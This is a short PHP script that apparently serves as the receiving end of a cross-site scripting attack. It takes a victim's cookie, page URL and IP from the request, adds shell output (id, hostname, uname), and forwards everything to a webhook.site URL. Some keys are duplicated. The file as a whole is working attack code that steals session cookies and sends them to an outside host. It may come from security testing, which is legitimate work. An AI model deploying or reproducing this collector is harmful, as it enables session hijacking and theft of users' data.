<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { exit; }

$output = [
    'status'        => 'XSS_FIRED',
    'server_id'     => trim(shell_exec('id')),
    'server_host'   => trim(shell_exec('hostname')),
    'server_os'     => trim(shell_exec('uname -a')),
    'victim_cookie' => $_GET['c'] ?? 'none',
    'server_host'   => trim(shell_exec('hostname')),
    'server_os'     => trim(shell_exec('uname -a')),
    'victim_cookie' => $_GET['c'] ?? 'none',
    'victim_url'    => $_GET['u'] ?? 'none',
    'victim_ip'     => $_SERVER['REMOTE_ADDR'],
    'timestamp'     => date('Y-m-d H:i:s'),
];

// Forward to webhook.site so you see it there too
@file_get_contents('https://webhook.site/3b738581-cb87-476c-84e6-eafed2e4b862?data='.urlencode(json_encode($output)));

echo json_encode($output, JSON_PRETTY_PRINT);
